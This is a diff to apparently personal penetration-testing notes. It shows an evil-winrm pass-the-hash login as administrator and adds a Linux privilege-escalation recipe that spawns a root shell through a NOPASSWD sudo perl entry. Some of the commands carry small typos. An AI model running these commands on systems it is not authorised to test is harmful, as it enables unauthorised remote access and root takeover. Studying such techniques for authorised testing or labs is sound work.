@@ -243,6 +243,16 @@ a. Network Exploitation
 		e.) evil-winrm
 		 If you got a username/password with hash and you want to get a shell from it, like a CMD/Powershell... you can use evil-winrm
 		 evil-winrm -i IP_Address -u administrator -p aad3b435b51404eeaad3b435b51404ee:05ea25098d1b3bf62d7b321d03235a52
+
+		f.) To get a SU access assuming in unix/linux environment
+			1. using a normal user, run the following command:
+				sudo -l
+			2. this will show what binary/applications can the user run as root on the machine
+				eg. (root) NOPASSWD: /usr/bin/perl
+			3. to get SU access, spawn a shell like this:
+				Sudo /usr/bin/perl -e ‘exec “/bin/sh”’
+				id
+				cd/root
 			
 	iii)Post Exploitation / Persistence
 		a.) Golden Ticket
